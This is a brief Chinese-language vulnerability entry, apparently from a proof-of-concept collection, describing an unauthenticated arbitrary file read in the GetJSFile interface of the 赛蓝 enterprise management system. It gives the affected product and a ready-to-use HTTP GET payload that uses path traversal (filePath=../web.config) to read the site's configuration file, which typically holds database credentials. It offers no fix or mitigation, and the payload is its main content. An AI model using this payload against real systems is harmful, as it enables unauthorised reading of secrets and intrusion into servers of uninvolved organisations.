**漏洞描述：**

赛蓝企业管理系统GetJSFile接口处存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

**影响版本：**

赛蓝企业管理系统

**Payload：**

```jsx
GET /Utility/GetJSFile?filePath=../web.config HTTP/1.1
```

---
